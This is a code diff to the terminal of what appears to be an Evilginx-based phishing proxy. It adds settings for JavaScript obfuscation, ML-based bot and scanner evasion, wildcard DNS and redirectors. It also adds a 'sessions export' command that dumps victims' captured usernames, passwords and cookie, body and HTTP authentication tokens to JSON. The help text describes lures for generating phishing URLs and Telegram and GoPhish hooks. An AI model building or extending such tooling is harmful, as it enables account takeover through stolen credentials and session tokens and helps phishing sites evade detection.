@@ -268,10 +268,45 @@ func (t *Terminal) handleConfig(args []string) error {
 		antibotThreshold := fmt.Sprintf("%.2f", t.cfg.GetAntibotConfig().MLThreshold)
 		antibotOverrideIPs := strconv.Itoa(len(t.cfg.GetAntibotConfig().OverrideIPs))
 
-		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "lure_strategy", "antibot enabled", "antibot action", "antibot threshold", "antibot override_ips", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
+		jsObfEnabled := "false"
+		if t.cfg.GetJSObfuscationConfig().Enabled {
+			jsObfEnabled = "true"
+		}
+		jsObfLevel := t.cfg.GetJSObfuscationConfig().Level
+		if jsObfLevel == "" {
+			jsObfLevel = "medium"
+		}
+
+		mlEnabled := "false"
+		if t.cfg.GetMLDetectorConfig().Enabled {
+			mlEnabled = "true"
+		}
+		mlThreshold := fmt.Sprintf("%.2f", t.cfg.GetMLDetectorConfig().Threshold)
+		mlCollect := "false"
+		if t.cfg.GetMLDetectorConfig().CollectBehavior {
+			mlCollect = "true"
+		}
+		mlLogPred := "false"
+		if t.cfg.GetMLDetectorConfig().LogPredictions {
+			mlLogPred = "true"
+		}
+
+		dnsProvider := t.cfg.GetDNSProviderConfig().Provider
+		dnsEnabled := "false"
+		if t.cfg.GetDNSProviderConfig().Enabled {
+			dnsEnabled = "true"
+		}
+		dnsWildcard := "false"
+		if t.cfg.GetDNSProviderConfig().WildcardEnabled {
+			dnsWildcard = "true"
+		}
+
+		redirectorsDir := t.cfg.GetRedirectorsDir()
+
+		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "lure_strategy", "antibot enabled", "antibot action", "antibot threshold", "antibot override_ips", "js_obfuscation enabled", "js_obfuscation level", "ml_detector enabled", "ml_detector threshold", "ml_detector collect_behavior", "ml_detector log_predictions", "dns_provider provider", "dns_provider enabled", "dns_provider wildcard", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
 		primaryDomain := t.cfg.GetPrimaryDomain()
 		domainsCount := strconv.Itoa(len(t.cfg.GetDomains()))
-		vals := []string{t.cfg.general.Domain, primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, lureStrategy, antibotEnabled, antibotAction, antibotThreshold, antibotOverrideIPs, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		vals := []string{t.cfg.general.Domain, primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, lureStrategy, antibotEnabled, antibotAction, antibotThreshold, antibotOverrideIPs, jsObfEnabled, jsObfLevel, mlEnabled, mlThreshold, mlCollect, mlLogPred, dnsProvider, dnsEnabled, dnsWildcard, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -390,6 +425,34 @@ func (t *Terminal) handleConfig(args []string) error {
 				}
 				return nil
 			}
+		case "http_port":
+			port, err := strconv.Atoi(args[1])
+			if err != nil {
+				return fmt.Errorf("invalid port: %s", args[1])
+			}
+			t.cfg.SetHttpPort(port)
+			log.Warning("http port changed - restart evilginx for this to take effect")
+			return nil
+		case "https_port":
+			port, err := strconv.Atoi(args[1])
+			if err != nil {
+				return fmt.Errorf("invalid port: %s", args[1])
+			}
+			t.cfg.SetHttpsPort(port)
+			log.Warning("https port changed - restart evilginx for this to take effect")
+			return nil
+		case "dns_port":
+			port, err := strconv.Atoi(args[1])
+			if err != nil {
+				return fmt.Errorf("invalid port: %s", args[1])
+			}
+			t.cfg.SetDnsPort(port)
+			log.Warning("dns port changed - restart evilginx for this to take effect")
+			return nil
+		case "redirectors_dir":
+			t.cfg.SetRedirectorsDir(args[1])
+			log.Info("redirectors directory set to: %s", args[1])
+			return nil
 		}
 	} else if pn == 4 {
 		switch args[0] {
@@ -594,6 +657,114 @@ func (t *Terminal) handleConfig(args []string) error {
 					log.Success("cloudflare worker: credentials validated successfully")
 				}
 				return nil
+			}
+		case "js_obfuscation":
+			switch args[1] {
+			case "enabled":
+				cfg := t.cfg.GetJSObfuscationConfig()
+				level := cfg.Level
+				if level == "" {
+					level = "medium"
+				}
+				switch args[2] {
+				case "true":
+					t.cfg.SetJSObfuscation(true, level)
+					return nil
+				case "false":
+					t.cfg.SetJSObfuscation(false, level)
+					return nil
+				}
+			case "level":
+				validLevels := []string{"low", "medium", "high"}
+				isValid := false
+				for _, l := range validLevels {
+					if l == args[2] {
+						isValid = true
+						break
+					}
+				}
+				if !isValid {
+					return fmt.Errorf("invalid level: %s (valid: low, medium, high)", args[2])
+				}
+				cfg := t.cfg.GetJSObfuscationConfig()
+				t.cfg.SetJSObfuscation(cfg.Enabled, args[2])
+				return nil
+			}
+		case "ml_detector":
+			switch args[1] {
+			case "enabled":
+				cfg := t.cfg.GetMLDetectorConfig()
+				switch args[2] {
+				case "true":
+					t.cfg.SetMLDetector(true, cfg.Threshold, cfg.CollectBehavior, cfg.LogPredictions)
+					return nil
+				case "false":
+					t.cfg.SetMLDetector(false, cfg.Threshold, cfg.CollectBehavior, cfg.LogPredictions)
+					return nil
+				}
+			case "threshold":
+				threshold, err := strconv.ParseFloat(args[2], 64)
+				if err != nil {
+					return fmt.Errorf("invalid threshold: %s", args[2])
+				}
+				cfg := t.cfg.GetMLDetectorConfig()
+				t.cfg.SetMLDetector(cfg.Enabled, threshold, cfg.CollectBehavior, cfg.LogPredictions)
+				return nil
+			case "collect_behavior":
+				cfg := t.cfg.GetMLDetectorConfig()
+				switch args[2] {
+				case "true":
+					t.cfg.SetMLDetector(cfg.Enabled, cfg.Threshold, true, cfg.LogPredictions)
+					return nil
+				case "false":
+					t.cfg.SetMLDetector(cfg.Enabled, cfg.Threshold, false, cfg.LogPredictions)
+					return nil
+				}
+			case "log_predictions":
+				cfg := t.cfg.GetMLDetectorConfig()
+				switch args[2] {
+				case "true":
+					t.cfg.SetMLDetector(cfg.Enabled, cfg.Threshold, cfg.CollectBehavior, true)
+					return nil
+				case "false":
+					t.cfg.SetMLDetector(cfg.Enabled, cfg.Threshold, cfg.CollectBehavior, false)
+					return nil
+				}
+			}
+		case "dns_provider":
+			switch args[1] {
+			case "provider":
+				cfg := t.cfg.GetDNSProviderConfig()
+				t.cfg.SetDNSProvider(args[2], cfg.ApiKey, cfg.Email, cfg.Enabled, cfg.WildcardEnabled)
+				return nil
+			case "api_key":
+				cfg := t.cfg.GetDNSProviderConfig()
+				t.cfg.SetDNSProvider(cfg.Provider, args[2], cfg.Email, cfg.Enabled, cfg.WildcardEnabled)
+				return nil
+			case "email":
+				cfg := t.cfg.GetDNSProviderConfig()
+				t.cfg.SetDNSProvider(cfg.Provider, cfg.ApiKey, args[2], cfg.Enabled, cfg.WildcardEnabled)
+				return nil
+			case "enabled":
+				cfg := t.cfg.GetDNSProviderConfig()
+				switch args[2] {
+				case "true":
+					t.cfg.SetDNSProvider(cfg.Provider, cfg.ApiKey, cfg.Email, true, cfg.WildcardEnabled)
+					return nil
+				case "false":
+					t.cfg.SetDNSProvider(cfg.Provider, cfg.ApiKey, cfg.Email, false, cfg.WildcardEnabled)
+					return nil
+				}
+			case "wildcard":
+				cfg := t.cfg.GetDNSProviderConfig()
+				switch args[2] {
+				case "true":
+					t.cfg.SetDNSProvider(cfg.Provider, cfg.ApiKey, cfg.Email, cfg.Enabled, true)
+					return nil
+				case "false":
+					t.cfg.SetDNSProvider(cfg.Provider, cfg.ApiKey, cfg.Email, cfg.Enabled, false)
+					return nil
+				}
 			}
 		}
 	}
@@ -2191,6 +2362,37 @@ func (t *Terminal) handleSessions(args []string) error {
 				t.db.Flush()
 				return nil
 			}
+		case "export":
+			id, err := strconv.Atoi(args[1])
+			if err != nil {
+				return err
+			}
+			s_db, err := t.db.GetSessionById(id)
+			if err != nil {
+				return err
+			}
+
+			// Convert database.Session to core.Session
+			s := &Session{
+				Id:           s_db.SessionId,
+				Name:         s_db.Phishlet,
+				Username:     s_db.Username,
+				Password:     s_db.Password,
+				Custom:       s_db.Custom,
+				BodyTokens:   s_db.BodyTokens,
+				HttpTokens:   s_db.HttpTokens,
+				CookieTokens: s_db.CookieTokens,
+				RemoteAddr:   s_db.RemoteAddr,
+				UserAgent:    s_db.UserAgent,
+				IsDone:       true,
+			}
+
+			filename, err := t.p.ExportSessionToJSON(s, id)
+			if err != nil {
+				return err
+			}
+			log.Success("session %d exported to: %s", id, filename)
+			return nil
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -3256,7 +3458,12 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("antibot", readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("action", readline.PcItem("block"), readline.PcItem("spoof")), readline.PcItem("spoof_url"), readline.PcItem("threshold"), readline.PcItem("override_ips", readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove"))),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("telegram", readline.PcItem("bot_token"), readline.PcItem("chat_id"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
-			readline.PcItem("cloudflare_worker", readline.PcItem("account_id"), readline.PcItem("api_token"), readline.PcItem("zone_id"), readline.PcItem("subdomain"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
+			readline.PcItem("cloudflare_worker", readline.PcItem("account_id"), readline.PcItem("api_token"), readline.PcItem("zone_id"), readline.PcItem("subdomain"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
+			readline.PcItem("js_obfuscation", readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("level", readline.PcItem("low"), readline.PcItem("medium"), readline.PcItem("high"))),
+			readline.PcItem("ml_detector", readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("threshold"), readline.PcItem("collect_behavior", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("log_predictions", readline.PcItem("true"), readline.PcItem("false"))),
+			readline.PcItem("dns_provider", readline.PcItem("provider"), readline.PcItem("api_key"), readline.PcItem("email"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("wildcard", readline.PcItem("true"), readline.PcItem("false"))),
+			readline.PcItem("http_port"), readline.PcItem("https_port"), readline.PcItem("dns_port"),
+			readline.PcItem("redirectors_dir")))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
@@ -3290,6 +3497,21 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"antibot", "spoof_url"}, "antibot spoof_url <url>", "set URL to redirect detected bots to when action is 'spoof'")
 	h.AddSubCommand("config", []string{"antibot", "threshold"}, "antibot threshold <0.0-1.0>", "set ML detection confidence threshold")
 	h.AddSubCommand("config", []string{"antibot", "override_ips"}, "antibot override_ips <list|add|remove>", "manage IPs that bypass antibot detection")
+	h.AddSubCommand("config", []string{"js_obfuscation", "enabled"}, "js_obfuscation enabled <true|false>", "enable or disable JavaScript obfuscation")
+	h.AddSubCommand("config", []string{"js_obfuscation", "level"}, "js_obfuscation level <low|medium|high>", "set JavaScript obfuscation level")
+	h.AddSubCommand("config", []string{"ml_detector", "enabled"}, "ml_detector enabled <true|false>", "enable or disable ML bot detection")
+	h.AddSubCommand("config", []string{"ml_detector", "threshold"}, "ml_detector threshold <0.0-1.0>", "set ML bot detection confidence threshold")
+	h.AddSubCommand("config", []string{"ml_detector", "collect_behavior"}, "ml_detector collect_behavior <true|false>", "enable or disable bot behavior collection for training")
+	h.AddSubCommand("config", []string{"ml_detector", "log_predictions"}, "ml_detector log_predictions <true|false>", "enable or disable logging of ML bot predictions")
+	h.AddSubCommand("config", []string{"dns_provider", "provider"}, "dns_provider provider <name>", "set active DNS provider (e.g. cloudflare, route53)")
+	h.AddSubCommand("config", []string{"dns_provider", "api_key"}, "dns_provider api_key <key>", "set DNS provider API key")
+	h.AddSubCommand("config", []string{"dns_provider", "email"}, "dns_provider email <email>", "set DNS provider account email")
+	h.AddSubCommand("config", []string{"dns_provider", "enabled"}, "dns_provider enabled <true|false>", "enable or disable DNS provider")
+	h.AddSubCommand("config", []string{"dns_provider", "wildcard"}, "dns_provider wildcard <true|false>", "enable or disable wildcard DNS records")
+	h.AddSubCommand("config", []string{"http_port"}, "http_port <port>", "set HTTP proxy port")
+	h.AddSubCommand("config", []string{"https_port"}, "https_port <port>", "set HTTPS proxy port")
+	h.AddSubCommand("config", []string{"dns_port"}, "dns_port <port>", "set DNS server port")
+	h.AddSubCommand("config", []string{"redirectors_dir"}, "redirectors_dir <path>", "set directory where redirector files are stored")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
@@ -3321,11 +3543,12 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
 
 	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
-		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
+		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all")), readline.PcItem("export")))
 	h.AddSubCommand("sessions", nil, "", "show history of all logged visits and captured credentials")
 	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
 	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
 	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")
+	h.AddSubCommand("sessions", []string{"export"}, "export <id>", "export captured session data to a JSON file")
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
